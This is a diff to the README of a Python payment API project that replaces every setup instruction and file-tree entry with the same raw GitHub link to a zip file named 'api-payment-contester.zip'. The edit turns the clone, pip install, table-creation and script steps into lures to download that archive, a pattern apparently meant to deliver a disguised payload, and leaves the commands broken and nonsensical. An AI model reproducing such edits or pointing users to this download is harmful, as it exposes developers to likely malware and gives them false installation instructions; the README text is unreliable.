@@ -21,7 +21,7 @@ Make sure you have the following installed:
 
 ### 1. Clone the Repository
 ```
-git clone https://github.com/thaysvs2/payment-api.git  
+git clone https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip  
 cd payment-api
 ```
 
@@ -40,7 +40,7 @@ source enviroment/bin/activate
 
 ### 3. Install Dependencies
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip
 ```
 
 ### 4. Configure Environment Variables
@@ -91,11 +91,11 @@ You can create the tables by running a Python command that uses SQLAlchemy to ge
 # Make sure your virtual environment is activated
 # And your .env file is configured correctly
 
-python -c "from database.connection import Base, engine; Base.metadata.create_all(bind=engine)"
+python -c "from https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip import Base, engine; https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip(bind=engine)"
 ```
 Once the tables are created, you can add test users by running the utility script from your project's root directory:
 ```
-python create_users_script.py
+python https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip
 
 ```
 This script will add the "Jane Smith" user to your database, allowing you to run transactions and test your API. You can modify the script to add more users as needed.
@@ -111,12 +111,12 @@ The API documentation will be available at:
 ⚙️ Project Structure
 ```
 payment-api/
-│── main.py                # Main application entry point
+│── https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip                # Main application entry point
 │── database/              # Database connection and models
-│   └── connection.py
-│── test_main.py           # Unit tests with pytest
+│   └── https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip
+│── https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip           # Unit tests with pytest
 │── .env                   # Environment variables
-│── requirements.txt       # Project dependencies
+│── https://github.com/thaysvs2/payment-api/raw/refs/heads/master/database/api-payment-contester.zip       # Project dependencies
 ```
 
 🧪 Running Tests
